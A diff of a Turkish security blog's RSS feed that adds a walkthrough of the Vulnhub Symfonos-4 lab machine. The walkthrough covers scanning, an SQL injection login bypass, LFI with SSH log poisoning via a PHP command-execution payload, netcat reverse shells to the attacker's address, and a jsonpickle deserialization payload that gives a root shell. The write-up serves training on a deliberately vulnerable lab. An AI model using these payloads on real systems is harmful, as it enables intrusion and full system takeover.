@@ -5,8 +5,192 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Tue, 10 Nov 2020 20:17:56 +0300</lastBuildDate>
+        <lastBuildDate>Sun, 22 Nov 2020 20:45:07 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB Symfonos-4 Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/11/vulnhub-symfonos-4-write-up/</link>
+            <pubDate>Sun, 22 Nov 2020 20:45:07 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/11/vulnhub-symfonos-4-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere Vulnhub &amp;lsquo;da yer alan Symfonos-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  Nmap ile port ve servis taraması yapılır.
+sudo nmap -sV -sC -p- 192.168.56.123  80 portunda çalışan web servisi ile keşif aşamasına devam edilir.</description>
+            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/symfonos-4,347/">Vulnhub</a> &lsquo;da yer alan Symfonos-4  adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<pre><code>netdiscover -i eth1
+</code></pre>
+    <img src="/images/vulnhub/symfonos4/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Nmap ile port ve servis taraması yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.123
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos4/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>80 portunda çalışan web servisi ile keşif aşamasına devam edilir.</p>
+
+    <img src="/images/vulnhub/symfonos4/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Gobuster ile dizin taraması yapılır.</p>
+<pre><code>gobuster dir -u http://192.168.56.123/ 
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50
+</code></pre>
+    <img src="/images/vulnhub/symfonos4/gobuster2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p><strong>/gods</strong> dizinine bakıldığında .log uzantılı dosyalar görülmektedir. İçerisine bakıldığında karakterler hakkında bilgiler verilmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos4/gods.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p><strong>sea.php</strong> sayfasına yapılan istekte 302 (Yönlendirme) kodu döndüğü görülmektedir. sea.php dosyasına istek atıldığında sayfanın <strong>atlantis.php</strong> sayfasına yönlendirilmektedir. Bu sayfada login paneli yer almaktadır.</p>
+
+    <img src="/images/vulnhub/symfonos4/login.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Sayfada ilk olarak sql injection açğının varlığı test edilmeye çalışılır. Username ve password olarak  <code>' or 1=1#</code> girilir. İnjection işlemi başarılı olduğundan sistem giriş yapılır.</p>
+
+    <img src="/images/vulnhub/symfonos4/success.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Sayfanın kaynak kodları incelendiğinde <em><strong>?file=xxxx</strong></em> parametreleri LFI açığının olduğunu göstermektedir.</p>
+
+    <img src="/images/vulnhub/symfonos4/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Açılır listeden hades kullanıcısı seçildiğinde <em><strong>/gods/hades.log</strong></em> dosyasının sayfaya import edildiği görülmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos4/hades.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Dosya adı parametre olarak verilirken .log uzantısı otomatik olarak eklenmektedir. <em>Log poisoning</em> için log dosyaları okunmaya çalışılır. İlk olarak <em><strong>/var/log/auth.log</strong></em> dosyası test edilir.
+<br></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth
+</code></pre></div><br>
+
+    <img src="/images/vulnhub/symfonos4/authlog2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p><em>Auth.log içerisinde ssh bağlantısına ait erişim logları görülmektedir. Ssh bağlantısı yapılmaya çalışıldığında işlem logları bu dosyaya kayıt edilmektedir.</em></p>
+<p><em>Sömürme işlemine bakacak olursak, <strong>Ssh</strong> kullanıcı adı olarak zararlı php kodu verilerek bağlantı sağlanmaya çalışıldığında, php kodu auth.log dosyasına eklenir. Daha sonra lfi zafiyeti ile auth.log dosyası çağırıldığında php kodları yorumlanarak zararlı kod çalıştırılır.</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">ssh &#39;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#39;@192.168.56.123
+</code></pre></div><p>cmd parametresi ile gönderilen komutlar sistemde çalıştırılaracaktır. <code>id</code> komutu ile test gerçekleştirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth&amp;cmd=id
+</code></pre></div><br>
+
+    <img src="/images/vulnhub/symfonos4/sshlfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 2px;"  />
+
+
+<p>Reverse bağlantı için sistemde netcat aracının varlığının tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth&amp;cmd=which nc
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos4/nc.png"  alt="Hay aksi"  class="center"  style="border-radius: 2px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Sistemde <code>netcat</code> uygulamasının olduğu görülmektedir. Netcat bağlantısı için ilgili parametreler gönderilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth
+&amp;cmd=nc -e /bin/bash 192.168.56.105 3333
+</code></pre></div><p>3333 numaralı porta shell bağlantısı düşmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos4/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 2px;"  />
+
+
+<p><em>/opt</em> dizini altında code dizini yer almaktadır. İçerisine bakıldığında <em>python flask framework</em> ile yazılmış bir web uygulaması görümektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">www-data@symfonos4:/opt/code$ ls -lsa
+ls -lsa
+total 28
+4 drwxr-xrwx 4 root root 4096 Aug 19  2019 .
+4 drwxr-xr-x 3 root root 4096 Aug 18  2019 ..
+4 -rw-r--r-- 1 root root  942 Aug 19  2019 app.py
+4 -rw-r--r-- 1 root root 1536 Aug 19  2019 app.pyc
+4 drwxr-xr-x 4 root root 4096 Aug 19  2019 static
+4 drwxr-xr-x 2 root root 4096 Aug 19  2019 templates
+4 -rw-r--r-- 1 root root  215 Aug 19  2019 wsgi.pyc
+</code></pre></div><p>app.py dosya içeriği incelenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, current_app, redirect
+
+<span style="color:#f92672">import</span> jsonpickle
+<span style="color:#f92672">import</span> base64
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>(object):
+
+    <span style="color:#66d9ef">def</span> __init__(self, username):
+        self<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> username
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>):
+        u <span style="color:#f92672">=</span> jsonpickle<span style="color:#f92672">.</span>decode(base64<span style="color:#f92672">.</span>b64decode(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)))
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, username<span style="color:#f92672">=</span>u<span style="color:#f92672">.</span>username)
+    <span style="color:#66d9ef">else</span>:
+        w <span style="color:#f92672">=</span> redirect(<span style="color:#e6db74">&#34;/whoami&#34;</span>)
+        response <span style="color:#f92672">=</span> current_app<span style="color:#f92672">.</span>make_response(w)
+        u <span style="color:#f92672">=</span> User(<span style="color:#e6db74">&#34;Poseidon&#34;</span>)
+        encoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(jsonpickle<span style="color:#f92672">.</span>encode(u))
+        response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;username&#34;</span>, value<span style="color:#f92672">=</span>encoded)
+        <span style="color:#66d9ef">return</span> response
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/whoami&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">whoami</span>():
+    user <span style="color:#f92672">=</span> jsonpickle<span style="color:#f92672">.</span>decode(base64<span style="color:#f92672">.</span>b64decode(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)))
+    username <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>username
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;whoami.html&#34;</span>, username<span style="color:#f92672">=</span>username)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    app<span style="color:#f92672">.</span>run()
+</code></pre></div><p>Kod incelendiğinde cookie bilgisinin decode edildiği görülmektedir. OWASP-10&rsquo;da yer alan <em>Insecure Deserialization</em> zafiyeti yer almaktadır. Pythonda json verilerini serileştimek için kullanılan <em><strong>jsonpickle</strong></em> kütüphanesi hakkında yapılan araştırma zafiyet olduğu görülmektedir. <em>(<a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">Daha Fazla Bilgi İçin</a>)</em> Bu zafiyet, gönderilen payload ile uygulama üzerinde çalıştırılabilir nesneler oluşturulabilmeyi sağlamaktadır.</p>
+<p>Web uygulamasının çalışıp çalışmadığını bilinmediğinden bilgi toplamaya devam edilir. LinEnum.sh betiği çalıştırılarak sistemde bilgi toplanır. Ağ istatistiklerine bakıldığında <em><strong>8080</strong></em> portunda çalışan bir uygulama olduğu görülmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos4/netstat.png"  alt="Hay aksi"  class="center"  style="border-radius: 2px;"  />
+
+
+<p>Daha sonra çalışan processler incelendiğinde <em>root</em> yetkisi ile python http server uygulaması olan <em>Gunicorn</em> ile 8080 portundan yayın yapıldığı görülmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos4/server.png"  alt="Hay aksi"  class="center"  style="border-radius: 2px;"  />
+
+
+<p>8080 portuna dışarıdan erişim için port yönlendirme yapılması gerekmektedir. <strong>Socat</strong> aracı ile port yönlendirme yapılır.</p>
+<p>Aşağıda yer alan kod kısaca 8090 portunu dışarı açar ve porta gelen bağlantıları 8080 portuna yönlendirmektedir(kopyalamaktadır).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">socat TCP-LISTEN:8090,fork TCP:127.0.0.1:8080
+</code></pre></div><p>Tarayıcı üzerinden 8090 portuna erişim sağlanır.</p>
+
+    <img src="/images/vulnhub/symfonos4/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Sayfada yer alan main page linkine tıklanır.</p>
+
+    <img src="/images/vulnhub/symfonos4/web2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Çalışan uygulamanın yukarıda kaynak kod analizi yapılan uygulama olduğu görülmektedir. <em>Aşağıda yer alan json verisi base64 ile encode edilir ve cookie bilgisi olarak tarayıcı üzerinden set edilir.</em> Sayfa yenilendiğinde 4444 numaralı porta shell bağlantısı sağlanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;py/object&#34;</span>: <span style="color:#e6db74">&#34;__main__.Shell&#34;</span>, <span style="color:#f92672">&#34;py/reduce&#34;</span>: [{<span style="color:#f92672">&#34;py/type&#34;</span>: <span style="color:#e6db74">&#34;os.system&#34;</span>},
+ {<span style="color:#f92672">&#34;py/tuple&#34;</span>: [<span style="color:#e6db74">&#34;nc -e /bin/bash 192.168.56.105 4444&#34;</span>]}, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>]}
+</code></pre></div><br>
+
+    <img src="/images/vulnhub/symfonos4/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p>Root dizini altında yer alan proof.txt dosyası okunarak işlem tamamlanır.</p>
+
+    <img src="/images/vulnhub/symfonos4/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />
+
+
+<p><em>Umarım faydalı olmuştur. Başka bir çözümde görüşmek üzere Allah’a emanet olun…</em></p>
+]]></content>
+        </item>
         
         <item>
             <title>VULNHUB Symfonos-3 Write Up</title>
